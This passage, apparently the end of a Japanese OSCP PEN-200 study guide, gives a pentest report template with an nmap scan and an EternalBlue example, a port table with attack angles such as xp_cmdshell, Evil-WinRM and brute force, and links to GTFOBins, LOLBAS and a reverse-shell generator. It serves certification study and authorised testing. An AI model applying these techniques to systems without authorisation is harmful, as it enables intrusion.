set -g @plugin 'tmux-plugins/tmux-logging'
# Prefix + Shift+P でログ開始

# コマンドにタイムスタンプを付ける
export HISTTIMEFORMAT='%F %T '
```

### 11.5 レポートテンプレート（各マシン）

```markdown
## 192.168.X.X - <Hostname>

### 概要
- OS: Windows Server 2019 / Ubuntu 20.04
- 重大度: Critical / High / Medium
- 侵害方法: [簡潔な説明]

### 発見した脆弱性
1. **CVE-XXXX-XXXX** - EternalBlue (MS17-010)

### 攻撃手順

#### Step 1: 情報収集
```bash
nmap -sC -sV -p- 192.168.X.X
```
[結果のスクリーンショット]

#### Step 2: エクスプロイト
[詳細な手順]

#### Step 3: 権限昇格
[詳細な手順]

### 証拠
**proof.txt**: `<HASH_VALUE>`
[スクリーンショット]

### 推奨対策
- パッチ適用: MS17-010
- ...
```

---

## 📌 クイックリファレンス

### よく使うポート

| ポート | サービス | 注目点 |
|--------|---------|--------|
| 21 | FTP | 匿名ログイン確認 |
| 22 | SSH | バージョン・キー認証 |
| 23 | Telnet | 平文通信 |
| 25 | SMTP | ユーザー列挙 |
| 53 | DNS | ゾーン転送 |
| 80/443 | HTTP/HTTPS | Webアプリ |
| 110 | POP3 | メール |
| 111 | RPCbind | NFS列挙 |
| 135 | MSRPC | Windows |
| 139/445 | SMB | 必ず列挙 |
| 161 | SNMP UDP | コミュニティ文字列 |
| 389 | LDAP | AD列挙 |
| 1433 | MSSQL | xp_cmdshell |
| 1521 | Oracle | |
| 2049 | NFS | マウント |
| 3306 | MySQL | |
| 3389 | RDP | ブルートフォース |
| 5985/5986 | WinRM | Evil-WinRM |
| 6379 | Redis | 認証なし確認 |
| 8080 | HTTP-Alt | Webアプリ |
| 27017 | MongoDB | 認証なし確認 |

### GTFOBins / LOLBAS 参照

```
GTFOBins (Linux SUID/Sudo悪用): https://gtfobins.github.io/
LOLBAS  (Windows バイナリ悪用): https://lolbas-project.github.io/
```

### RevShell ジェネレーター

```
https://www.revshells.com/
```

---

*最終更新: 2025年 | OSCP PEN-200対応版*
